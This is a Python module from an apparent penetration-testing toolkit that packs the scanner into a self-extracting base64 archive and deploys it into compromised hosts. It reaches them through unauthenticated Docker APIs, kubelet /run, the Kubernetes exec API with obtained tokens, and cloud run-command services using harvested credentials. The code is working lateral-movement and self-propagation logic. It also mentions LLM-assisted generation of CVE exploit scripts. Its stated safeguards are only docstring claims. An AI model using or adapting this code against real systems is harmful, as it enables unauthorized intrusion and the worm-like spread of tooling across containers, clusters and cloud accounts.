"""Self-extracting scanner propagation to proven footholds.

When --propagate-script is active and a foothold is PROVEN (Docker, kubelet, K8s API),
this module packages the entire scanner into a self-extracting base64 archive, deploys
it into the foothold, runs a scan from inside, collects results, and auto-cleans.

Safety invariants:
* Deployment ONLY onto proven footholds (already confirmed exploitable).
* Requires explicit --yes or interactive confirmation (checked by main.py).
* Payload is auto-cleaned (removed after execution).
* Deployed scan runs at the SAME intensity/scope as the parent — never escalates.
* Results are merged back into the parent's proof-of-access ledger.
"""
from __future__ import annotations

import base64
import io
import json
import os
import tarfile
import time
from typing import List, Optional, Tuple

from exploits import netutil

try:
    import config as _cfg
except Exception:  # pragma: no cover
    _cfg = None  # type: ignore

_PROPAGATE_TIMEOUT = getattr(_cfg, "PROPAGATE_TIMEOUT", 120)
_PROPAGATE_CLEANUP = getattr(_cfg, "PROPAGATE_CLEANUP", True)
_PROPAGATE_DEPLOY_PATH = getattr(_cfg, "PROPAGATE_DEPLOY_PATH", "/tmp/.sectest_propagate")
_PROPAGATE_MAX_OUTPUT = getattr(_cfg, "PROPAGATE_MAX_OUTPUT", 65536)

# The toolkit root (where main.py lives).
_TOOL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def pack_scanner(*, exclude_tests: bool = True, exclude_venv: bool = True,
                 bundle_llm: bool = True, bundle_cve_cache: bool = False) -> bytes:
    """Create a tar.gz archive of the scanner source tree as bytes.

    This is the payload deployed into footholds. It includes all .py files, the data/
    directory, and config.py — everything needed for a standalone run.

    If ``bundle_llm=True`` (default), the llm/ directory is included so the propagated
    scanner can use a local Ollama instance on the foothold (or discover one on the
    network) for CVE exploit script generation. The LLM client is stdlib-only so it
    adds no dependency — just the advisor.py interface to Ollama's HTTP API.

    If ``bundle_cve_cache=True``, includes data/cve/cache/*.json so the propagated
    instance starts with the parent's cached NVD/OSV responses (avoids re-querying).
    """
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for dirpath, dirnames, filenames in os.walk(_TOOL_DIR):
            # Skip exclusions
            rel_dir = os.path.relpath(dirpath, _TOOL_DIR)
            skip = False
            for part in rel_dir.split(os.sep):
                if part.startswith(".") and part != ".":
                    skip = True
                if part == "__pycache__":
                    skip = True
                if exclude_tests and part == "tests":
                    skip = True
                if exclude_venv and part in (".venv", "venv", "env"):
                    skip = True
                # Skip audit_log (large, per-run)
                if part == "audit_log":
                    skip = True
            if skip:
                continue
            # Skip llm/ if explicitly opted out
            if not bundle_llm and "llm" in rel_dir.split(os.sep):
                continue
            # Skip CVE cache unless explicitly requested
            if not bundle_cve_cache and "cache" in rel_dir.split(os.sep):
                # Allow data/cve/ itself but not data/cve/cache/
                if "cve" in rel_dir.split(os.sep):
                    continue
            for fname in filenames:
                full = os.path.join(dirpath, fname)
                arcname = os.path.join("sectest", os.path.relpath(full, _TOOL_DIR))
                # Only include Python sources, JSON data, and text configs
                ext = os.path.splitext(fname)[1].lower()
                if ext in (".py", ".json", ".txt", ".cfg", ".toml", ".ini"):
                    try:
                        tar.add(full, arcname=arcname)
                    except (OSError, PermissionError):
                        continue
    return buf.getvalue()


def _b64_payload(archive: bytes) -> str:
    """Base64-encode the archive for safe transport through shell commands."""
    return base64.b64encode(archive).decode("ascii")


def _deploy_script(b64_archive: str, deploy_path: str, args_json: str = "[]") -> str:
    """Generate the shell script that unpacks, runs, and cleans the scanner.

    The script is designed to be piped into /bin/sh inside the foothold.
    Arguments are passed via a JSON sidecar file (no shell injection possible).
    It auto-detects if Ollama is available and enables LLM-assisted CVE testing.
    """
    # Escape single quotes in args_json for safe embedding in heredoc
    safe_args_json = args_json.replace("'", "'\\''")
    return f"""#!/bin/sh
set -e
DEPLOY="{deploy_path}"
mkdir -p "$DEPLOY"
echo '{b64_archive}' | base64 -d | tar xz -C "$DEPLOY" 2>/dev/null
cd "$DEPLOY/sectest"
# Write arguments as a JSON sidecar (avoids shell injection)
cat > "$DEPLOY/sectest/_propagate_args.json" << 'ARGSEOF'
{safe_args_json}
ARGSEOF
# Auto-detect Ollama for LLM-assisted CVE exploit generation
LLM_FLAG=""
if command -v ollama >/dev/null 2>&1 || curl -s http://localhost:11434/api/version >/dev/null 2>&1; then
  LLM_FLAG="--llm"
elif curl -s http://host.docker.internal:11434/api/version >/dev/null 2>&1; then
  OLLAMA_HOST="http://host.docker.internal:11434"
  export OLLAMA_HOST
  LLM_FLAG="--llm"
fi
# Execute via Python: read args from JSON sidecar, append LLM flag, exec main.py
python3 -c "
import json, sys, os
args = json.load(open('_propagate_args.json'))
# Append LLM flag if detected
if '--llm' in sys.argv[1:]:
    args.append('--llm')
os.execv(sys.executable, [sys.executable, 'main.py'] + args)
" $LLM_FLAG 2>"$DEPLOY/_stderr.log" || true
cd /
rm -rf "$DEPLOY"
"""


def _args_list_to_json(args_list: Optional[List[str]] = None) -> str:
    """Serialize an args list to JSON for the sidecar file."""
    return json.dumps(args_list or [])


def deploy_via_docker(host: str, port: int, archive: bytes,
                      extra_args: str = "", args_list: Optional[List[str]] = None,
                      timeout: float = 0) -> Tuple[bool, str]:
    """Deploy the scanner into a Docker foothold and collect results.

    Uses the Docker API to create a container with the archive, run the scan,
    and retrieve stdout (JSON results). Container is auto-removed.

    Accepts either ``args_list`` (preferred, JSON-safe) or legacy ``extra_args``
    (shell string, deprecated).
    """
    timeout = timeout or _PROPAGATE_TIMEOUT
    deploy_path = _PROPAGATE_DEPLOY_PATH
    b64 = _b64_payload(archive)

    if args_list is not None:
        args_json = _args_list_to_json(args_list)
    else:
        # Legacy: convert extra_args string to a list (best-effort)
        args_json = json.dumps(extra_args.split() if extra_args.strip() else [])

    script = _deploy_script(b64, deploy_path, args_json)

    base = f"http://{host}:{port}"
    # Create a container that runs the deployment script
    create_body = json.dumps({
        "Image": "python:3.12-slim",
        "Cmd": ["/bin/sh", "-c", script],
        "NetworkMode": "host",
        "AutoRemove": True,
        "Labels": {"sectest": "propagate", "AUTHORIZED-ASSESSMENT": "safe-to-delete"},
    }).encode()

    st, body, _ = netutil.http_request(
        f"{base}/containers/create", "POST",
        headers={"Content-Type": "application/json"},
        body=create_body, timeout=10)
    if not st or st not in (200, 201):
        return False, f"container create failed: HTTP {st}"

    try:
        cid = json.loads(body or "{}").get("Id", "")
    except (json.JSONDecodeError, AttributeError):
        return False, "cannot parse container ID"

    if not cid:
        return False, "empty container ID"

    # Start the container
    st2, _, _ = netutil.http_request(
        f"{base}/containers/{cid}/start", "POST", timeout=5)
    if st2 and st2 not in (200, 204, 304):
        return False, f"container start failed: HTTP {st2}"

    # Wait for completion (bounded)
    st3, wait_body, _ = netutil.http_request(
        f"{base}/containers/{cid}/wait", "POST", timeout=timeout)

    # Retrieve logs (stdout = scan results as JSON, stderr = warnings/diagnostics)
    st4, logs, _ = netutil.http_get(
        f"{base}/containers/{cid}/logs?stdout=1&stderr=1",
        timeout=10, max_bytes=_PROPAGATE_MAX_OUTPUT)

    return True, logs or ""


def deploy_via_kubelet(host: str, port: int, namespace: str, pod: str,
                       container: str, archive: bytes,
                       extra_args: str = "", args_list: Optional[List[str]] = None,
                       timeout: float = 0) -> Tuple[bool, str]:
    """Deploy the scanner into a pod via kubelet /run endpoint."""
    timeout = timeout or _PROPAGATE_TIMEOUT
    deploy_path = _PROPAGATE_DEPLOY_PATH
    b64 = _b64_payload(archive)

    # Build args JSON for sidecar
    if args_list is not None:
        args_json = _args_list_to_json(args_list)
    else:
        args_json = json.dumps(extra_args.split() if extra_args.strip() else [])

    # Kubelet /run executes a command in a running container
    base = f"https://{host}:{port}"
    # Step 1: write the archive + args sidecar via base64 + tar
    unpack_cmd = (f"mkdir -p {deploy_path} && "
                  f"echo '{b64}' | base64 -d | tar xz -C {deploy_path} && "
                  f"printf '%s' '{args_json}' > {deploy_path}/sectest/_propagate_args.json")
    st, _, _ = netutil.http_request(
        f"{base}/run/{namespace}/{pod}/{container}",
        "POST", headers={"Content-Type": "application/x-www-form-urlencoded"},
        body=f"cmd=sh&cmd=-c&cmd={unpack_cmd}".encode(),
        timeout=timeout)
    if not st or st != 200:
        return False, f"kubelet unpack failed: HTTP {st}"

    # Step 2: run the scanner via JSON args sidecar
    run_cmd = (f"cd {deploy_path}/sectest && "
               f"python3 -c \""
               f"import json,sys,os;"
               f"args=json.load(open('_propagate_args.json'));"
               f"os.execv(sys.executable,[sys.executable,'main.py']+args)\"")
    st2, output, _ = netutil.http_request(
        f"{base}/run/{namespace}/{pod}/{container}",
        "POST", headers={"Content-Type": "application/x-www-form-urlencoded"},
        body=f"cmd=sh&cmd=-c&cmd={run_cmd}".encode(),
        timeout=timeout)

    # Step 3: cleanup
    if _PROPAGATE_CLEANUP:
        cleanup_cmd = f"rm -rf {deploy_path}"
        netutil.http_request(
            f"{base}/run/{namespace}/{pod}/{container}",
            "POST", headers={"Content-Type": "application/x-www-form-urlencoded"},
            body=f"cmd=sh&cmd=-c&cmd={cleanup_cmd}".encode(),
            timeout=5)

    return bool(st2 and st2 == 200), output or ""


def deploy_via_k8s_api(api_url: str, token: str, namespace: str, pod: str,
                       container: str, archive: bytes,
                       extra_args: str = "", args_list: Optional[List[str]] = None,
                       timeout: float = 0) -> Tuple[bool, str]:
    """Deploy the scanner into a pod via K8s API exec."""
    timeout = timeout or _PROPAGATE_TIMEOUT
    deploy_path = _PROPAGATE_DEPLOY_PATH
    b64 = _b64_payload(archive)

    # Build args JSON for sidecar
    if args_list is not None:
        args_json = _args_list_to_json(args_list)
    else:
        args_json = json.dumps(extra_args.split() if extra_args.strip() else [])

    headers = {"Authorization": f"Bearer {token}"} if token else {}
    base = api_url.rstrip("/")

    # exec endpoint
    exec_url = (f"{base}/api/v1/namespaces/{namespace}/pods/{pod}"
                f"/exec?container={container}&stdout=true&stderr=true&command=sh&command=-c")

    # Step 1: unpack + write args sidecar
    unpack_cmd = (f"mkdir -p {deploy_path} && "
                  f"echo '{b64}' | base64 -d | tar xz -C {deploy_path} && "
                  f"printf '%s' '{args_json}' > {deploy_path}/sectest/_propagate_args.json")
    st, _, _ = netutil.http_request(
        f"{exec_url}&command={unpack_cmd}",
        "POST", headers=headers, timeout=timeout)

    # Step 2: run via JSON args sidecar
    run_cmd = (f"cd {deploy_path}/sectest && "
               f"python3 -c \""
               f"import json,sys,os;"
               f"args=json.load(open('_propagate_args.json'));"
               f"os.execv(sys.executable,[sys.executable,'main.py']+args)\"")
    st2, output, _ = netutil.http_request(
        f"{exec_url}&command={run_cmd}",
        "POST", headers=headers, timeout=timeout)

    # Step 3: cleanup
    if _PROPAGATE_CLEANUP:
        cleanup_cmd = f"rm -rf {deploy_path}"
        netutil.http_request(
            f"{exec_url}&command={cleanup_cmd}",
            "POST", headers=headers, timeout=5)

    return bool(st2 and st2 == 200), output or ""


def parse_propagated_results(output: str) -> Optional[dict]:
    """Parse JSON results from a propagated scan's stdout."""
    if not output:
        return None
    # The output may have non-JSON prefix (container log headers, etc.)
    # Find the first { and try to parse from there
    for i, ch in enumerate(output):
        if ch == "{":
            try:
                return json.loads(output[i:])
            except json.JSONDecodeError:
                continue
    return None


def merge_propagated_findings(parent_results: list, propagated: dict,
                              reached_from: str) -> list:
    """Merge findings from a propagated scan back into the parent's results list.

    Each finding is annotated with the foothold provenance.
    """
    from exploits.base import ExploitResult, Finding
    findings_data = propagated.get("findings") or propagated.get("results") or []
    merged: List = []
    for item in findings_data:
        if isinstance(item, dict):
            findings = []
            for f in item.get("findings", []):
                findings.append(Finding(
                    title=f"[propagated from {reached_from}] {f.get('title', '')}",
                    severity=f.get("severity", "INFO"),
                    location=f.get("location", reached_from),
                    detail=f.get("detail", ""),
                    evidence=f.get("evidence", ""),
                    cwe=f.get("cwe", ""),
                    category=f.get("category", ""),
                    tags=f.get("tags", []) + ["propagated"],
                ))
            if findings:
                merged.append(ExploitResult(
                    name=f"propagated:{item.get('name', 'unknown')}",
                    description=f"[from {reached_from}] {item.get('description', '')}",
                    exploited=item.get("exploited", False),
                    findings=findings,
                ))
    return merged


# ===========================================================================
# Universal Propagation (v2) — strategy-based, cross-platform
# ===========================================================================

def propagate_universal(foothold: dict, args: List[str], *,
                        strategy: Optional[str] = None,
                        relay=None,
                        timeout: float = 0) -> Tuple[bool, str]:
    """Universal propagation entry point — auto-selects strategy and transport.

    This is the new preferred entry point for propagation. It:
    1. Detects target platform (via relay probe if available)
    2. Selects payload strategy (native > zipapp > source)
    3. Selects transport (SSH > Docker > kubelet > K8s API > cloud)
    4. Delivers and executes

    Args:
        foothold: dict describing the proven foothold, with keys:
            - type: 'docker', 'kubelet', 'k8s-api', 'ssh', 'aws-ssm', 'gcp-oslogin', 'azure-runcommand'
            - host, port, token, etc. (transport-specific)
        args: CLI arguments for the propagated scanner instance
        strategy: force a strategy ('native', 'zipapp', 'source') or None for auto
        relay: optional Relay instance for platform detection
        timeout: max execution time

    Returns:
        (success: bool, output: str)
    """
    from sandbox.propagate_pack import (
        select_strategy, detect_platform_via_relay, detect_python_available
    )
    from sandbox.propagate_transport import select_transport

    timeout = timeout or _PROPAGATE_TIMEOUT

    # Step 1: Platform detection
    platform = None
    has_python = True  # assume True for backward compatibility
    if relay:
        platform = detect_platform_via_relay(relay)
        has_python = detect_python_available(relay)

    # Step 2: Select payload strategy
    payload_strat = select_strategy(platform=platform, has_python=has_python, force=strategy)

    # Step 3: Select transport
    transport = select_transport(foothold)
    if not transport:
        # Fallback to legacy deploy methods
        return _legacy_deploy(foothold, args, timeout)

    # Step 4: Deliver and execute
    return transport.deliver_and_exec(foothold, payload_strat.payload, args, timeout=timeout)


def _legacy_deploy(foothold: dict, args: List[str], timeout: float) -> Tuple[bool, str]:
    """Fallback to the original deploy methods when no transport matches."""
    ftype = foothold.get("type", "")
    archive = pack_scanner()

    if ftype == "docker":
        return deploy_via_docker(
            foothold["host"], foothold.get("port", 2375),
            archive, args_list=args, timeout=timeout)
    elif ftype == "kubelet":
        return deploy_via_kubelet(
            foothold["host"], foothold.get("port", 10250),
            foothold.get("namespace", "default"),
            foothold.get("pod", ""), foothold.get("container", ""),
            archive, args_list=args, timeout=timeout)
    elif ftype == "k8s-api":
        return deploy_via_k8s_api(
            foothold["api_url"], foothold.get("token", ""),
            foothold.get("namespace", "default"),
            foothold.get("pod", ""), foothold.get("container", ""),
            archive, args_list=args, timeout=timeout)
    return False, f"unsupported foothold type: {ftype}"


def propagate_to_cloud_target(target: dict, cred: dict, args: List[str],
                              *, strategy: Optional[str] = None,
                              timeout: float = 0) -> Tuple[bool, str]:
    """Propagate to a cloud instance using cloud-specific APIs.

    Args:
        target: dict from cloud_lateral/cloud_pivot with instance details:
            - provider: 'aws', 'gcp', 'azure', 'oci', 'scaleway', 'digitalocean', 'nutanix'
            - instance_id, region, zone, etc. (provider-specific)
        cred: cloud credential dict
        args: CLI arguments for propagated instance
        strategy: force payload strategy or None for auto
        timeout: max execution time

    Returns:
        (success: bool, output: str)
    """
    from sandbox.propagate_pack import select_strategy
    from sandbox import propagate_cloud

    timeout = timeout or _PROPAGATE_TIMEOUT
    provider = target.get("provider", "")

    # Build payload (default to zipapp for cloud targets — they usually have Python)
    payload_strat = select_strategy(
        platform=target.get("platform", "linux-amd64"),
        has_python=True,
        force=strategy,
    )
    payload = payload_strat.payload

    if provider == "aws":
        if target.get("ssm_managed"):
            return propagate_cloud.propagate_aws_ssm(
                target["instance_id"], target.get("region", "us-east-1"),
                cred, payload, args, timeout)
        if target.get("ecs_task"):
            return propagate_cloud.propagate_aws_ecs_exec(
                target["cluster"], target["task_id"], target.get("container", ""),
                target.get("region", "us-east-1"), cred, payload, args, timeout)

    elif provider == "gcp":
        return propagate_cloud.propagate_gcp_oslogin(
            target["project"], target["zone"], target["instance"],
            cred.get("token", ""), payload, args, timeout)

    elif provider == "azure":
        return propagate_cloud.propagate_azure_runcommand(
            target["subscription_id"], target["resource_group"],
            target["vm_name"], cred.get("token", ""),
            payload, args, timeout)

    elif provider == "oci":
        return propagate_cloud.propagate_oci_instance_agent(
            target["instance_id"], target.get("compartment_id", ""),
            target.get("region", ""), cred, payload, args, timeout)

    elif provider == "scaleway":
        return propagate_cloud.propagate_scaleway_ssh(
            target["instance_id"], target.get("zone", "fr-par-1"),
            cred.get("token", ""), payload, args, timeout)

    elif provider == "digitalocean":
        return propagate_cloud.propagate_digitalocean(
            target["droplet_id"], cred.get("token", ""),
            payload, args, timeout)

    elif provider == "nutanix":
        return propagate_cloud.propagate_nutanix_guest_tools(
            target["vm_uuid"], target.get("cluster_url", ""),
            cred, payload, args, timeout)

    return False, f"unsupported cloud provider: {provider}"
